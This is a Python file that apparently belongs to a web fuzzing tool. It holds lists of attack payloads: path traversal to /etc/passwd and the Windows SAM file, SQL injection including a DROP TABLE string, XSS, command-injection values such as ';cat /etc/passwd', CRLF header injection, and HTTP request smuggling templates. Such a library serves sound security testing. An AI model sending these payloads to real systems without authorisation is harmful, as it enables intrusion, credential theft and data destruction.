"""
HTTP Attack Payloads Library
"""

class HttpPayloads:
    """Collection of HTTP fuzzing payloads"""

    # Path traversal and injection payloads
    PATH_PAYLOADS = [
        # Directory traversal
        "/../../../etc/passwd",
        "/../../../../etc/passwd",
        "/../../../../../etc/passwd",
        "/../../../../../../etc/passwd",
        "/../../../../../../../../etc/passwd",
        "\\..\\..\\..\\windows\\system32\\config\\sam",
        "/..\\..\\..\\etc\\passwd",

        # Encoded traversal
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%252e%252e/%252e%252e/etc/passwd",
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/..%252f..%252f..%252fetc%252fpasswd",

        # Null byte injection
        "/%00",
        "/index.html%00.jpg",
        "/admin%00",
        "/../../etc/passwd%00",

        # Overflows
        "/" + "A" * 1000,
        "/" + "A" * 5000,
        "/" + "A" * 10000,

        # SQL Injection
        "/' OR '1'='1",
        "/' OR '1'='1' --",
        "/' OR 1=1 --",
        "/admin' OR '1'='1",
        "/' UNION SELECT NULL--",

        # XSS
        "/<script>alert(1)</script>",
        "/<img src=x onerror=alert(1)>",
        "/\"><script>alert(1)</script>",
        "/'><script>alert(1)</script>",

        # Command Injection
        "/;id",
        "/|id",
        "/`id`",
        "/$(id)",
        "/;cat /etc/passwd",

        # Path normalization bypass
        "//etc/passwd",
        "///etc///passwd",
        "/./etc/./passwd",
        "/etc/./passwd",
        "/etc//passwd",

        # Case variations
        "/Admin",
        "/ADMIN",
        "/aDmIn",

        # Special endpoints
        "/admin",
        "/administrator",
        "/login",
        "/wp-admin",
        "/.git/config",
        "/.svn/entries",
        "/.env",
        "/web.config",
        "/WEB-INF/web.xml",
    ]

    # Header attack payloads
    HEADER_ATTACKS = {
        # Buffer overflow
        "overflow": "A" * 10000,

        # CRLF Injection
        "crlf_basic": "test\r\nX-Injected: true",
        "crlf_double": "test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0",
        "crlf_split": "test\r\nSet-Cookie: admin=true",

        # Null bytes
        "null_byte": "test\x00admin",

        # Unicode
        "unicode": "test\u0000\u000a\u000d",

        # Control characters
        "control": "test\x01\x02\x03\x04",

        # Very long header value
        "long": "X" * 100000,
    }

    # Cookie fuzzing payloads
    COOKIE_PAYLOADS = [
        # SQLi in cookies
        "admin=1' OR '1'='1",
        "session=' OR 1=1--",

        # XSS in cookies
        "user=<script>alert(1)</script>",

        # Path traversal
        "file=../../etc/passwd",

        # Overflow
        "session=" + "A" * 10000,

        # Encoding
        "admin=%00true",
        "session=%0d%0aX-Injected:true",

        # Special chars
        "user='; DROP TABLE users--",
        "token=\"><script>alert(1)</script>",
    ]

    # HTTP Request Smuggling Templates
    SMUGGLING_PAYLOADS = {
        # CL.TE (Content-Length vs Transfer-Encoding)
        "cl_te": {
            "headers": {
                "Content-Length": ["13"],
                "Transfer-Encoding": ["chunked"]
            },
            "body": b"0\r\n\r\nSMUGGLED"
        },

        # TE.CL (Transfer-Encoding vs Content-Length)
        "te_cl": {
            "headers": {
                "Transfer-Encoding": ["chunked"],
                "Content-Length": ["4"]
            },
            "body": b"5c\r\nSMUGGLED\r\n0\r\n\r\n"
        },

        # TE.TE (Obfuscated Transfer-Encoding)
        "te_te_obfuscated": {
            "headers": {
                "Transfer-Encoding": ["chunked"],
                "Transfer-Encoding ": ["identity"]  # Note the trailing space
            },
            "body": b"0\r\n\r\nSMUGGLED"
        },

        # Double Content-Length
        "double_cl": {
            "headers": {
                "Content-Length": ["10", "5"]
            },
            "body": b"SMUGGLED"
        }
    }

    # Header names to fuzz
    FUZZ_HEADERS = [
        "Host", "User-Agent", "Accept", "Accept-Language",
        "Accept-Encoding", "Connection", "Cookie", "Referer",
        "X-Forwarded-For", "X-Real-IP", "X-Original-URL",
        "Authorization", "Content-Type", "Content-Length",
        "Transfer-Encoding", "Range", "If-Modified-Since",
        "Cache-Control", "Origin", "X-Requested-With"
    ]
